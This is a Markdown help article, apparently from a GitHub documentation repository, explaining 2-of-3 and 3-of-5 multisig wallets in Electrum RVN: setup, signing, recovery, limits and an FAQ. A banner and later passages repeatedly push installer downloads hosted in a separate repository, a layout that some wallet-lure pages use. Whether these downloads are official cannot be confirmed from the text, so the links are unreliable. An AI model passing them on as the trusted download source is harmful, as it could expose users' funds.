![Electrum RVN](assets/banner-article.png)

# Multisig Wallets in Electrum RVN

<!-- compact-download-block -->

<p align="center">Spending that needs more than one key</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A multisig wallet spreads control across several keys, so that spending requires agreement - 2-of-3 and 3-of-5 are supported here. No single machine, seed or stolen laptop can move funds alone. The cost is that setup and recovery have more parts, and every part has to be written down correctly.

## What "2-of-3" means

Three keys exist, and any two of them can sign a transaction. Lose one key and you can still spend with the other two; lose two and the funds are stuck. The third key is redundancy, not a spare to be careless with.

A 3-of-5 works the same way at a larger scale: five keys, any three sign, and you can lose two and still recover. More keys means more places to keep a backup and more coordination for every spend.

| Setup | Signers needed | Survives losing | Spends need |
| --- | --- | --- | --- |
| 2-of-3 | 2 | one key | two devices or people |
| 3-of-5 | 3 | two keys | three devices or people |

## Why bother

A single-seed wallet has one failure that matters: whoever gets the seed gets everything. Multisig replaces that with a threshold, so a compromised machine, a stolen paper or a coerced signature is not enough.

It also lets you split custody between people or locations - one key at home, one in a safe, one with a co-signer - without giving any one of them the ability to spend.

## Setting it up

1. **Decide the threshold first.** 2-of-3 for a single person with devices in different places; 3-of-5 when several people are involved.
2. **Create the keys separately.** Each cosigner generates their own seed on their own machine or device. Do not create all three on one computer - that puts every key in one place and defeats the purpose.
3. **Collect the public keys**, not the seeds. Each participant shares their extended public key; the seeds stay with their owners.
4. **Assemble the wallet** from those public keys in the wallet's multisig setup, with the threshold you chose.
5. **Write down the wallet's configuration** - the threshold, the public keys and the order. This is the part people lose, and without it the seed alone is not enough to rebuild the wallet.
6. **Test with a small amount.** Send a little, spend it with the required signatures, confirm it works, then fund properly.

Step five is the difference between a multisig wallet and a permanent puzzle. Each cosigner should hold a copy of the configuration, and one copy should live with the seeds.

## Spending

A spend needs the required number of signatures. The usual flow: one participant builds the transaction, each signer reviews it and signs, and the completed transaction is broadcast.

Two rules make this safe rather than ceremonial. **Every signer reads the destination and amount on their own screen**, not on a screenshot from the organiser. And **the transaction is not broadcast until the threshold is met** - a partially signed transaction has no authority.

If signers are in different places, the unsigned transaction travels between them; treat each file as you would in [cold storage](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md), and never let one person hold both the transaction and the signing device without review.

## Recovery is the hard part

Losing a device is survivable by design. Losing the configuration is not: a multisig wallet cannot be rebuilt from one seed alone, because the wallet is defined by the set of public keys and the threshold.

So back up, separately and in more than one place:

- each participant's own seed (their responsibility, their paper);
- the wallet's configuration - threshold plus all public keys, in order;
- a note of which key belongs to whom.

Test a recovery before you rely on it. Rebuild the wallet from the configuration on a spare machine, with the seeds you have, and check the balance appears. A multisig setup you have never restored is a hope with more steps.

## Where multisig does not help

- **A single compromised signer** can refuse to cooperate, which blocks spending. Thresholds protect against theft, not against a cosigner going silent.
- **A lost configuration** defeats the whole setup even with every seed intact.
- **Phishing on one signer** can still produce a signature on a bad transaction - review on each screen is what catches it.

That is why multisig is paired with process: named cosigners, a documented configuration, and a rehearsed recovery.

## Multisig and hardware wallets

The strongest common setup is one device per key: three hardware wallets, each holding one seed, with the multisig wallet assembled from their public keys. Pairing is covered in [pairing a Ledger with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md) and [using a Trezor with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md); the detection problems those devices have are in [Ledger not detected](https://github.com/electrum-source/passphrase-backup/blob/main/ledger-not-detected-by-electrum-rvn.md) and [Trezor not detected](https://github.com/electrum-source/passphrase-backup/blob/main/trezor-not-detected-by-electrum-rvn.md).

A watch-only copy of the multisig wallet on an everyday machine is the monitoring half - [watch-only wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md) - and the file encryption question is [wallet file encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Set every participant up on that release before you fund the wallet, so a version mismatch does not appear halfway through a spend.

## FAQ

### Is 2-of-3 safer than a single wallet?

Yes for theft: one stolen key is not enough to spend. It is not simpler - setup and recovery have more parts, and a lost configuration is its own failure.

### Can I do multisig with one person?

Yes. Three devices or three seeds in three locations, two required to spend. It protects against device theft and single-point loss.

### What happens if I lose one key?

You can still spend with the remaining keys if the threshold is met. Replace the lost key by creating a new wallet with a new key set and moving the funds.

### Can I recover from seeds alone?

Only with the wallet's configuration - the threshold and every public key in order. Without it, the seeds do not tell the wallet what shape to rebuild.

### Do all signers need the same version?

They should be on the same release, and the current one is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Mismatched versions are a common cause of a transaction that will not complete.

<!-- related-articles -->

## Related articles

- [Electrum RVN Cold Storage Workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md)
- [Pairing a Ledger With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md)
- [Using a Trezor With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md)
- [Ledger Not Detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/ledger-not-detected-by-electrum-rvn.md)
